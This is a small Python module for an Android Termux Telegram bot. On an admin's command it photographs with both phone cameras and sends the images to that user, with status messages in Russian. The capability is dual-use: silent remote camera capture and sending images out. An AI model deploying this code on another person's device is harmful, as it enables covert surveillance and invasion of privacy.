import telebot
import checkAdmin
import config
from termux import API

bot = telebot.TeleBot(config.TOKEN)

def makeSendPhoto(userId):
	if not checkAdmin.c(userId):
		return

	bot.send_message(userId, '⌛️ Выполняю...')
	cam0 = API.generic('termux-camera-photo -c 0 assets/cam0.jpg')
	if cam0[0] == 0:
		cam0Photo = open('assets/cam0.jpg', 'rb')
		bot.send_photo(userId, cam0Photo, caption=' 📸 Фото с основной камеры')
	
	else:
		bot.send_message(userId, '🔴 Ошибка...')

	cam1 = API.generic('termux-camera-photo -c 1 assets/cam1.jpg')
	if cam1[0] == 0:
		cam1Photo = open('assets/cam1.jpg', 'rb')
		bot.send_photo(userId, cam1Photo, caption='📸 Фото с фронтальной камеры')

	else:
		bot.send_message(userId, '🔴 Ошибка...')

